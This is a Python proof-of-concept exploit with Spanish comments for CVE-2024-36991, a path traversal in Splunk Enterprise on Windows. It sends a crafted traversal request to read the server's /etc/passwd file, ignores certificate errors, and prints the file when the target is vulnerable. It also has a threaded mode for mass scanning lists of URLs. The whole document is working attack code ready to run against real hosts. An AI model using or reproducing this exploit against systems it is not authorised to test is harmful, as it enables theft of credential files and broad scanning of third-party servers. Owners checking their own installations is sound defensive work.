"""

POC para CVE-2024-36991: Traversal de ruta que afecta a Splunk Enterprise en versiones de Windows debajo de 9.2.2, 9.1.5 y 9.0.10
                                                                           

Uso:
    Escaneo único: Splunk-Path.py -u https://objetivo:9090
    Escaneo masivo: Splunk-Path.py -f archivo.txt
"""

import requests
import argparse
import threading
import queue
import os
from datetime import datetime
import urllib3

# deshabilita advertencias de certificado SSL 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Color:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

# Ruta de vuln
PATH_TRAVERSAL_PAYLOAD = "/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd"

#solicitud  GET
def make_request(url):
    try:
        response = requests.get(url, verify=False)
        return response.text if response.status_code == 200 else None
    except requests.RequestException as e:
        return None

#  vulnerabilidad en un host específico
def test_host(url):
    try:
        full_url = f"{url}{PATH_TRAVERSAL_PAYLOAD}"
        response_body = make_request(full_url)
        if response_body and 'admin:' in response_body:
            print(f"{Color.CYAN}[VLUN] Vulnerable: {url}{Color.RESET}")
            print(response_body)
        else:
            print(f"{Color.YELLOW}[WARNING] No vulnerable: {url}{Color.RESET}")
    except requests.RequestException as e:
        print(f"{Color.RED}[ERROR] Tiempo de espera agotado: {url}{Color.RESET}")

# worker para el threading
def worker(url_queue):
    while True:
        url = url_queue.get()
        print(f"{Color.GRAY}[INFO] Probando: {url}{Color.RESET}")
        test_host(url)
        url_queue.task_done()

def main():
    print(f"{Color.CYAN}")
    print("""
                                                                        
                                                                           
    ->  Archivo /etc/passwd de Splunk. 
    """)
    print(f"{Color.RESET}")

    # parser de argumentos
    parser = argparse.ArgumentParser(description='Comprobador de CVE-2024-36991 en Splunk Enterprise para Windows.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='URL de destino (ej. http://ejemplo.com)')
    group.add_argument('-f', '--file', help='Archivo que contiene una lista de URLs (una por línea)')
    args = parser.parse_args()

    # Creación del directorio de logs si no existe
    LOG_DIR = 'logs'
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        print(f"{Color.GRAY}[INFO] Directorio de registro creado: {LOG_DIR}{Color.RESET}")

    # Iniciar escaneo según el modo 
    if args.url:
        print(f"{Color.GRAY}[INFO] Escaneo de objetivo único: {args.url}{Color.RESET}")
        test_host(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
        print(f"{Color.GRAY}[INFO] Escaneo de múltiples objetivos desde el archivo: {args.file}{Color.RESET}")

        url_queue = queue.Queue()
        for url in urls:
            url_queue.put(url)

        # Iniciar threads para procesar las URLs de manera concurrente
        num_threads = min(10, len(urls))  #máximo de 10 hilos
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=worker, args=(url_queue,))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

        print(f"{Color.GRAY}[INFO] Escaneo completo.{Color.RESET}")

if __name__ == '__main__':
    main()
